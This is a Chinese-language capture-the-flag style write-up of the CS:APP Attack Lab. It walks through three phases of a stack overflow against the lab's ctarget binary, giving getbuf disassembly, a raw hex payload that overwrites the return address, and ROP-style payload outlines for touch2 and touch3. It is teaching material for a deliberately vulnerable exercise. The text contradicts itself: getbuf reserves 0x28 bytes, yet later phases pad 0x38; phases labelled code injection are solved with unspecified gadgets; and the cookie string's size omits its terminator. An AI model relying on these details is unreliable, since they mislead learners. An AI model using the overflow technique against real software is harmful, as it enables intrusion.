---
title: 《深入理解计算机系统》Attack Lab 题解
contest: CS:APP
year: 2024
difficulty: medium
vuln_type: rop
tags: [CSAPP-Attack-Lab, ret2func, ret2arg, ROP-gadget, x86-64, hex2raw]
attack_chain: Phase 1 (CI): getbuf 0x28 栈空间 + Gets 无界读 → 0x28 字节 padding + 0x4017c0 touch1 地址覆盖返回 → hex2raw < phase_1 | ./ctarget -q/Phase 2 (CII): touch2(unsigned val) 需要 val==cookie → 0x38 字节 padding + pop_rdi gadget + cookie 立即数 + touch2 地址/Phase 3 (CIII): touch3(char *s) 读 s 字符串 → 0x38 padding + pop_rdi + 栈地址（指向 cookie 字符串） + touch3
key_payload: Phase 1: 0x28 bytes 0x00 + p64(0x4017c0)  Phase 2: 0x38 bytes + pop_rdi(0x59b997fa) + touch2  Phase 3: 0x38 bytes + pop_rdi(栈地址) + touch3
one_liner: CSAPP 经典 Attack Lab 三阶段 ROP 题解：ret2func → ret2arg → 栈地址存 cookie 字符串后 ret2arg。
lesson: Phase 1 直接覆盖返回地址；Phase 2 引入 pop_rdi gadget 传参；Phase 3 把 cookie 字符串放在栈上，用栈地址作为参数；hex2raw 工具把 ASCII hex 转为原始字节给 ctarget 喂。
quality: high
---

# CSAPP Attack Lab 题解

## 概览
《深入理解计算机系统》(CS:APP) 第 3 版 Attack Lab 三阶段 ROP 题解。

## Phase 1 (CI) - ret2func

### 漏洞
```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

### getbuf 反汇编
```
00000000004017a8 <getbuf>:
  4017a8: sub    $0x28, %rsp
  4017ac: mov    %rsp, %rdi
  4017af: callq  401a40 <Gets>   ; Gets 无界读
  4017b4: mov    $0x1, %eax
  4017b9: add    $0x28, %rsp
  4017bd: retq
```

### payload
```
00 00 00 00 00 00 00 00  (8 字节 × 5 = 0x28 字节 padding)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00 00 00 00 00  ; touch1 地址 0x4017c0
```

### 工具
`./hex2raw < phase_1 | ./ctarget -q`

## Phase 2 (CII) - ret2arg

### touch2 签名
```c
void touch2(unsigned val) {
    vlevel = 2;
    if (val == cookie) {  // val 必须 == 0x59b997fa
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else { fail(2); }
}
```

### payload
```
0x38 bytes padding
pop_rdi gadget    ; 从 rdi 加载第一个参数
cookie 立即数     ; 0x59b997fa
touch2 地址       ; 0x4017ec
```

## Phase 3 (CIII) - ret2arg + 栈字符串

### touch3 签名
```c
void touch3(char *s) {
    vlevel = 3;
    if (hexmatch(cookie, s)) {  // s 指向 cookie 字符串表示
        printf("Touch3!: You called touch3()\n");
        validate(3);
    } else { fail(3); }
}
```

### payload
```
0x38 bytes padding
pop_rdi gadget
栈地址 (指向 cookie 字符串)
touch3 地址
cookie 字符串   ; 在栈上 8 字节表示
```

## 经验提炼
- Phase 1 直接覆盖返回地址 0x4017c0
- Phase 2 引入 `pop rdi; ret` gadget 传第一个参数
- Phase 3 把 cookie 字符串放在栈上（覆盖 padding 后面），用栈地址作为指针参数
- hex2raw 工具把 ASCII 十六进制转换为原始字节给 ctarget 喂
- 栈地址可在 gdb 中查 rsp 或从 `0x556...` 起算
- cookie 字符串示例：`"59b997fa"` (8 字节 ASCII)
